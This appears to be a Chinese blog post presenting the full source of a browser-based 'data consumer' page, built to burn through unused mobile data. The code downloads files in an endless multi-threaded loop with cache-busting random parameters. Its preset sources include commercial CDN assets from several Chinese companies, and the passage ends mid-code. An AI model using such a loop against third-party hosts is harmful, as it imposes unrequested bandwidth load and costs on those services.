    <content type="html"><![CDATA[<p>校园卡一个月49，将近300G的流量和400分钟通话，每月用不完就会显得很亏，所以需要一个消耗流量的工具</p><p>为了能随时随地消耗流量，这个工具需要有极佳的跨平台能力，所以我选择B&#x2F;S架构，无论在哪个平台，只要有浏览器就能用</p><p>我在网上找到了这个项目<a href="https://github.com/shidahuilang/flow-consumer/">https://github.com/shidahuilang/flow-consumer/</a> ，但并不是很好，比如包含了跟踪器和禁用f12（我真想不明白你一个开源项目禁用f12干什么…意义不明）</p><p>基于这个项目，我编写<del>(复制粘贴)</del>了一个非常轻量的流量消耗器，只有短短200行的html代码和两个js库</p><p>在线体验：<a href="https://crackme.net/tools/fuck_isp">https://crackme.net/tools/fuck_isp</a></p><p><img src="/articles/fuck_isp/1.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>流量消耗器<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/axios@1.7.7/dist/axios.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">            <span class="hljs-selector-tag">body</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">font-family</span>: Arial, sans-serif;</span><br><span class="language-css">                <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f4f4f4</span>;</span><br><span class="language-css">                <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;</span><br><span class="language-css">                <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-class">.container</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">                <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;</span><br><span class="language-css">                <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);</span><br><span class="language-css">                <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-tag">label</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">                <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">font-weight</span>: bold;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-tag">select</span>,</span><br><span class="language-css">            <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;number&quot;</span>]</span>,</span><br><span class="language-css">            <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;text&quot;</span>]</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><br><span class="language-css">                <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">                <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">box-sizing</span>: border-box;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-tag">button</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><br><span class="language-css">                <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#007bff</span>;</span><br><span class="language-css">                <span class="hljs-attribute">border</span>: none;</span><br><span class="language-css">                <span class="hljs-attribute">color</span>: white;</span><br><span class="language-css">                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="language-css">                <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.3s</span>;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#0056b3</span>;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span> <span class="hljs-number">0</span>;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-tag">strong</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">color</span>: <span class="hljs-number">#007bff</span>;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>) &#123;</span><br><span class="language-css">                <span class="hljs-selector-class">.container</span> &#123;</span><br><span class="language-css">                    <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;</span><br><span class="language-css">                &#125;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;</span>下载节点<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;set.input&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;https://speed.cloudflare.com/__down?bytes=100000000&quot;</span> <span class="hljs-attr">selected</span>=<span class="hljs-string">&quot;selected&quot;</span>&gt;</span>[默认] cloudflare 100MB<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;https://www.cucloud.cn/templets/1/default/images/nodes-overview-bg.png&quot;</span>&gt;</span>联通云<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;https://cd.pddpic.com/android_dev/2024-10-29/2cbce5a94a1ff8cb4e8125a114960a03.apk&quot;</span>&gt;</span>拼多多<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;https://i0.hdslb.com/bfs/article/d435b548d27ec95c226c6d217210d98d22682236.gif&quot;</span>&gt;</span>bilibili<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;https://lf1-cdn-tos.bytegoofy.com/goofy/ies/douyin_home_web/imgs/mob_1-1.15453147.gif&quot;</span>&gt;</span>抖音<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;set.input&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;下载链接&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;threads&quot;</span>&gt;</span>线程<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;set.thread&quot;</span> <span class="hljs-attr">min</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;run&quot;</span>&gt;</span>&#123;&#123;set.status?&#x27;停止&#x27;:&#x27;开始&#x27;&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>速度：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> &#123;&#123;speed&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>用时：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> &#123;&#123;FormatTime(spend)&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>已消耗流量：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> &#123;&#123;FormatSize(waste)&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> errors = <span class="hljs-literal">null</span>;</span><br><span class="language-javascript">            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">set</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">input</span>: <span class="hljs-string">&quot;https://speed.cloudflare.com/__down?bytes=100000000&quot;</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">output</span>: <span class="hljs-string">&quot;&quot;</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">infinite</span>: <span class="hljs-literal">true</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">thread</span>: <span class="hljs-number">1</span>,</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-attr">tasks</span>: [],</span><br><span class="language-javascript">                    <span class="hljs-attr">speed</span>: <span class="hljs-string">&quot;0&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">spend</span>: <span class="hljs-number">0</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">waste</span>: <span class="hljs-number">0</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">timer</span>: <span class="hljs-literal">null</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">cancelSource</span>: axios.<span class="hljs-property">CancelToken</span>.<span class="hljs-title function_">source</span>(),</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">watch</span>: &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">async</span> <span class="hljs-string">&quot;set.status&quot;</span>(newVal) &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">if</span> (newVal) &#123;</span><br><span class="language-javascript">                            <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelSource</span> = axios.<span class="hljs-property">CancelToken</span>.<span class="hljs-title function_">source</span>();</span><br><span class="language-javascript">                            <span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">                                <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span> =</span><br><span class="language-javascript">                                    <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">FormatSize</span>(</span><br><span class="language-javascript">                                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">prev, curr</span>) &#123;</span><br><span class="language-javascript">                                            <span class="hljs-keyword">return</span> prev + curr;</span><br><span class="language-javascript">                                        &#125;, <span class="hljs-number">0</span>)</span><br><span class="language-javascript">                                    ) + <span class="hljs-string">&quot;/s&quot;</span>;</span><br><span class="language-javascript">                                <span class="hljs-variable language_">this</span>.<span class="hljs-property">spend</span>++;</span><br><span class="language-javascript">                            &#125;, <span class="hljs-number">1000</span>);</span><br><span class="language-javascript">                            <span class="hljs-keyword">do</span> &#123;</span><br><span class="language-javascript">                                <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">                                    <span class="hljs-keyword">let</span> task = [];</span><br><span class="language-javascript">                                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">set</span>.<span class="hljs-property">thread</span>; i++) &#123;</span><br><span class="language-javascript">                                        task.<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">download</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>).<span class="hljs-title function_">substr</span>(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>)));</span><br><span class="language-javascript">                                    &#125;</span><br><span class="language-javascript">                                    <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(task).<span class="hljs-title function_">finally</span>(resolve);</span><br><span class="language-javascript">                                &#125;);</span><br><span class="language-javascript">                            &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">set</span>.<span class="hljs-property">status</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">set</span>.<span class="hljs-property">infinite</span>);</span><br><span class="language-javascript">                        &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                            <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span>);</span><br><span class="language-javascript">                            <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelSource</span>.<span class="hljs-title function_">cancel</span>();</span><br><span class="language-javascript">                        &#125;</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">                    <span class="hljs-title function_">run</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">set</span>.<span class="hljs-property">status</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">set</span>.<span class="hljs-property">status</span>;</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-title function_">download</span>(<span class="hljs-params">id</span>) &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">let</span> loaded = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">                        <span class="hljs-keyword">let</span> speed = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">                        <span class="hljs-keyword">let</span> timestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();</span><br><span class="language-javascript">                        <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;</span><br><span class="language-javascript">                        <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">push</span>(speed) - <span class="hljs-number">1</span>;</span><br><span class="language-javascript">                        <span class="hljs-keyword">return</span> axios</span><br><span class="language-javascript">                            .<span class="hljs-title function_">request</span>(&#123;</span><br><span class="language-javascript">                                <span class="hljs-attr">url</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">set</span>.<span class="hljs-property">input</span>,</span><br><span class="language-javascript">                                <span class="hljs-attr">params</span>: &#123;</span><br><span class="language-javascript">                                    [id]: id,</span><br><span class="language-javascript">                                &#125;,</span><br><span class="language-javascript">                                <span class="hljs-attr">cancelToken</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelSource</span>.<span class="hljs-property">token</span>,</span><br><span class="language-javascript">                                <span class="hljs-attr">onDownloadProgress</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">progressEvent</span>) &#123;</span><br><span class="language-javascript">                                    <span class="hljs-keyword">const</span> now = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();</span><br><span class="language-javascript">                                    speed = ((progressEvent.<span class="hljs-property">loaded</span> - loaded) / (now - timestamp)) * <span class="hljs-number">1000</span>;</span><br><span class="language-javascript">                                    that.<span class="hljs-property">tasks</span>[index] = speed;</span><br><span class="language-javascript">                                    that.<span class="hljs-property">waste</span> += progressEvent.<span class="hljs-property">loaded</span> - loaded;</span><br><span class="language-javascript">                                    loaded = progressEvent.<span class="hljs-property">loaded</span>;</span><br><span class="language-javascript">                                    timestamp = now;</span><br><span class="language-javascript">                                &#125;,</span><br><span class="language-javascript">                            &#125;)</span><br><span class="language-javascript">                            .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">                                <span class="hljs-keyword">if</span> (!axios.<span class="hljs-title function_">isCancel</span>(e)) &#123;</span><br><span class="language-javascript">                                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">set</span>.<span class="hljs-property">status</span> = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">                                    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">alert</span>(e.<span class="hljs-property">message</span>);</span><br><span class="language-javascript">                                &#125;</span><br><span class="language-javascript">                            &#125;)</span><br><span class="language-javascript">                            .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">                                <span class="hljs-keyword">delete</span> that.<span class="hljs-property">tasks</span>[index];</span><br><span class="language-javascript">                            &#125;);</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-title class_">FormatTime</span>(second) &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">if</span> (second &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">                        <span class="hljs-keyword">const</span> hour = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(second / <span class="hljs-number">3600</span>);</span><br><span class="language-javascript">                        <span class="hljs-keyword">const</span> min = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(second / <span class="hljs-number">60</span>) % <span class="hljs-number">60</span>;</span><br><span class="language-javascript">                        <span class="hljs-keyword">const</span> sec = second % <span class="hljs-number">60</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">                        <span class="hljs-keyword">const</span> hourStr = hour &gt; <span class="hljs-number">0</span> ? <span class="hljs-string">`<span class="hljs-subst">$&#123;hour &lt; <span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span> : <span class="hljs-string">&quot;&quot;</span>&#125;</span><span class="hljs-subst">$&#123;hour&#125;</span>h`</span> : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript">                        <span class="hljs-keyword">const</span> minStr = hour &gt; <span class="hljs-number">0</span> || min &gt; <span class="hljs-number">0</span> ? <span class="hljs-string">`<span class="hljs-subst">$&#123;min &lt; <span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span> : <span class="hljs-string">&quot;&quot;</span>&#125;</span><span class="hljs-subst">$&#123;min&#125;</span>m`</span> : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript">                        <span class="hljs-keyword">const</span> secStr = <span class="hljs-string">`<span class="hljs-subst">$&#123;sec &lt; <span class="hljs-number">10</span> ? <span class="hljs-string">&quot;0&quot;</span> : <span class="hljs-string">&quot;&quot;</span>&#125;</span><span class="hljs-subst">$&#123;sec&#125;</span>s`</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">                        <span class="hljs-keyword">return</span> hourStr + minStr + secStr;</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-title class_">FormatSize</span>(bytes) &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">if</span> (bytes === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0 